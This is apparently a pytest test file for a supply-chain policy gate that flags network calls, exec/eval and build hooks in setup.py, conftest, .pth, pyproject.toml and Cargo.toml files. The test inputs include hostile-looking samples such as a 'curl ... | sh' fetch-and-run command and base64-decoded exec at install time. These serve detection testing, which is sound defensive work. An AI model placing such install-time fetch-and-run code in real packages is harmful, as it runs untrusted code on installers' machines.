"""package-lifecycle-scripts: setup.py, conftest, startup files, .pth, pyproject.toml and Cargo.toml, both ways."""

from __future__ import annotations

import pytest
from policies import lifecyclekit

mod = lifecyclekit.load_gate()
U = "https://get.example.com/p"
SHA = "0123456789abcdef" * 2 + "01234567"


def hits(path: str, text: str) -> list[tuple[str, str]]:
    return [(f["rule"], f["level"]) for f in mod.findings({"writes": {path: text}})]


SETUP = "from setuptools import setup\n"


@pytest.mark.parametrize(
    ("body", "found"),
    [
        ("import urllib.request\nurllib.request.urlopen('" + U + "')\n", [("setup-import-time", "block")]),
        ("from urllib import request as r\nr.urlretrieve('" + U + "', 'x')\n", [("setup-import-time", "block")]),
        ("import requests\nif True:\n    requests.get('" + U + "')\n", [("setup-import-time", "block")]),
        ("import base64\nexec(base64.b64decode('eA=='))\n", [("setup-import-time", "block")] * 2),
        ("import builtins\nbuiltins.eval('1')\n", [("setup-import-time", "block")]),
        ("import marshal\nmarshal.loads(b'')\n", [("setup-import-time", "block")]),
        ("import zlib\nzlib.decompress(b'')\n", [("setup-import-time", "block")]),
        ("import socket\nsocket.create_connection(('h', 1))\n", [("setup-import-time", "block")]),
        ("import subprocess\nsubprocess.check_output(['git', 'describe'])\n", [("setup-import-time", "ask")]),
        ("import os\nos.system('curl -s " + U + " | sh')\n", [("setup-import-time", "block")]),
        ("from os import execv\nexecv('/bin/x', [])\n", [("setup-import-time", "ask")]),
        ("import socket\nHOST = socket.gethostname()\n", []),
        ("import codecs\nREADME = codecs.open('README.md').read()\n", []),
        ("import urllib.parse\nurllib.parse.urljoin('a', 'b')\n", []),
        ("def later():\n    import requests\n    requests.get('" + U + "')\n", []),
        ("x = lambda: eval('1')\n", []),
        ("print(open('README.md').read())\n", []),
        ("f()(1)\n", []),
        ("@deco(eval('1'))\ndef g():\n    pass\n", [("setup-import-time", "block")]),
    ],
)
def test_setup_import_time_calls(body: str, found: list[tuple[str, str]]) -> None:
    assert hits("setup.py", SETUP + body) == found


@pytest.mark.parametrize(
    ("body", "found"),
    [
        (
            "from setuptools.command.install import install\nclass I(install):\n    def run(self):\n"
            "        import urllib.request\n        urllib.request.urlopen('" + U + "')\n",
            [("setup-cmdclass", "block")],
        ),
        (
            "import setuptools.command.build_py as b\nclass B(b.build_py):\n    def run(self):\n"
            "        self.spawn(['make'])\n",
            [("setup-cmdclass", "ask")],
        ),
        (
            "from setuptools.command.develop import develop\nclass D(develop):\n    def run(self):\n"
            "        import subprocess\n        subprocess.run(['make'])\n",
            [("setup-cmdclass", "ask")],
        ),
        ("setup(name='p', cmdclass={'install': object})\n", [("setup-cmdclass", "ask")]),
        ("class Helper(object):\n    pass\nsetup(name='p')\n", []),
    ],
)
def test_setup_command_overrides(body: str, found: list[tuple[str, str]]) -> None:
    assert hits("setup.py", SETUP + body) == found


def test_moving_an_override_keeps_its_key() -> None:
    body = "from setuptools.command.install import install\nclass I(install):\n    pass\n"
    key = [f["key"] for f in mod.findings({"writes": {"setup.py": SETUP + body}})]
    moved = [f["key"] for f in mod.findings({"writes": {"setup.py": SETUP + "\n\n# note\n" + body}})]
    assert key == moved


@pytest.mark.parametrize(("path", "level"), [("setup.py", "block"), ("tests/conftest.py", "ask")])
def test_unparseable_python(path: str, level: str) -> None:
    assert hits(path, "def broken(:\n") == [("python-unparseable", level)]


@pytest.mark.parametrize(
    ("text", "found"),
    [
        ("import requests\nDATA = requests.get('" + U + "').json()\n", [("conftest-import-time", "block")]),
        ("import subprocess\nREV = subprocess.check_output(['git', 'rev-parse', 'HEAD'])\n",
         [("conftest-import-time", "ask")]),
        ("import pytest\n\n@pytest.fixture\ndef net():\n    import requests\n    return requests.get('x')\n", []),
    ],
)  # fmt: skip
def test_conftest(text: str, found: list[tuple[str, str]]) -> None:
    assert hits("tests/conftest.py", text) == found


@pytest.mark.parametrize(
    ("path", "text", "level"),
    [
        ("sitecustomize.py", "import sys\nsys.dont_write_bytecode = True\n", "ask"),
        ("lib/usercustomize.py", "import urllib.request\nurllib.request.urlopen('" + U + "')\n", "block"),
    ],
)
def test_startup_files(path: str, text: str, level: str) -> None:
    assert hits(path, text) == [("python-startup-file", level)]


def test_pth_import_lines() -> None:
    text = "/opt/lib\nimport os\nimport\tsys\n  import x\n# import y\n"
    assert hits("site/a.PTH", text) == [("pth-import", "block")] * 2


@pytest.mark.parametrize(
    ("text", "found"),
    [
        ('[build-system]\nrequires = ["setuptools>=61", "wheel"]\n', [("py-build-requires", "ask")] * 2),
        ('[build-system]\nrequires = ["setuptools>=61,<70", "hatchling==1.21", "x~=1.0", 3]\n', []),
        ("[build-system]\nrequires = [\"x ; python_version < '3.12'\"]\n", [("py-build-requires", "ask")]),
        ('[build-system]\nrequires = ["x @ git+https://git.example.com/x"]\n', [("py-build-requires", "block")]),
        ('[build-system]\nrequires = ["x @ https://get.example.com/x.whl"]\n', [("py-build-requires", "block")]),
        (f'[build-system]\nrequires = ["x @ git+https://git.example.com/x@{SHA}"]\n', []),
        ('[build-system]\nrequires = "setuptools"\n', []),
        ('[build-system]\nbuild-backend = "backend"\nbackend-path = ["_build"]\n', [("py-backend-path", "ask")]),
        ('[tool.hatch.build.hooks.custom]\npath = "hatch_build.py"\n', [("py-build-hook", "ask")]),
        ('[tool.hatch.build.hooks.vcs]\nversion-file = "v.py"\n', []),
        ("[tool.hatch.build.targets.wheel.hooks.custom]\n", [("py-build-hook", "ask")]),
        ('[tool.hatch.build.targets.sdist]\ninclude = ["a"]\n', []),
        ('[tool.poetry]\nbuild = "build.py"\n', [("py-build-hook", "ask")]),
        ('[tool.poetry.build]\nscript = "build.py"\n', [("py-build-hook", "ask")]),
        ("[tool.pdm.build]\nrun-setuptools = true\n", [("py-build-hook", "ask")]),
        ('[tool.pdm.build]\nincludes = ["a"]\n', []),
        ('[tool.setuptools.cmdclass]\nbuild_py = "b.B"\nsdist = "b.S"\n', [("setup-cmdclass", "ask")] * 2),
        ('[project]\nname = "p"\n', []),
        ("[project\n", [("manifest-unparseable", "block")]),
    ],
)
def test_pyproject(text: str, found: list[tuple[str, str]]) -> None:
    assert hits("pyproject.toml", text) == found


def test_build_requires_key_ignores_the_version() -> None:
    def keys(spec: str) -> list[str]:
        return [
            f["key"] for f in mod.findings({"writes": {"pyproject.toml": f'[build-system]\nrequires = ["{spec}"]\n'}})
        ]

    assert keys("setuptools>=61") == keys("setuptools >= 68")


@pytest.mark.parametrize(
    ("text", "found"),
    [
        ('[package]\nname = "a"\nbuild = "gen.rs"\n', [("cargo-build-script", "ask")]),
        ('[package]\nname = "a"\nbuild = false\n', []),
        ("[lib]\nproc-macro = true\n", [("cargo-proc-macro", "ask")]),
        ("[lib]\nproc_macro = true\n", [("cargo-proc-macro", "ask")]),
        ("[lib]\nproc-macro = false\n", []),
        ('[build-dependencies]\ncc = "1.0"\n', [("cargo-build-dependency", "ask")]),
        ('[build-dependencies]\nreqwest = { version = "0.12" }\n', [("cargo-build-dependency", "block")]),
        ('[build_dependencies]\nh = { package = "ureq", version = "2" }\n', [("cargo-build-dependency", "block")]),
        ("[target.'cfg(unix)'.build-dependencies]\ncurl = \"0.4\"\n", [("cargo-build-dependency", "block")]),
        ('[dependencies]\nreqwest = "0.12"\n', []),
        ("[package\n", [("manifest-unparseable", "block")]),
    ],
)
def test_cargo_toml(text: str, found: list[tuple[str, str]]) -> None:
    assert hits("crate/Cargo.toml", text) == found


def test_build_dependency_key_ignores_the_version() -> None:
    def keys(spec: str) -> list[str]:
        return [f["key"] for f in mod.findings({"writes": {"Cargo.toml": f"[build-dependencies]\ncc = {spec}\n"}})]

    assert keys('"1.0.80"') == keys('{ version = "1.0.83", features = ["parallel"] }')
